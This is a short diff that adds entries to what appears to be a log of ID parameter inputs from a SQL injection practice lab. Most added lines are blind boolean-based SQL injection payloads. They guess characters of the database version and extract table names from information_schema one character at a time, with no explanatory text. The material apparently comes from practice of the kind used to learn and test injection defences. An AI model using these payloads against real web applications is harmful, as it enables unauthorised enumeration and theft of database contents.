@@ -41,3 +41,13 @@ ID:1' AND (ascii(substr((select group_concat(table_name) from information_schema
 ID:1' and (ascii(substr(version(),2,1))=ascii('.'))-- 
 ID:1' and (ascii(substr(version(),3,1))=ascii('.'))-- 
 ID:1 and (ascii(substr(version(),3,1))=ascii('.'))-- 
+ID:1
+ID:?id=1' AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,1))=ascii('e'))-- 
+ID:1
+ID:1' and (select substr(version(),2,1))= 0-- 
+ID:1
+ID:1
+ID:1' and (select substr(version(),1,1))< 6-- 
+ID:1' and (select substr(version(),1,1))= 6-- 
+ID:1
+ID:1
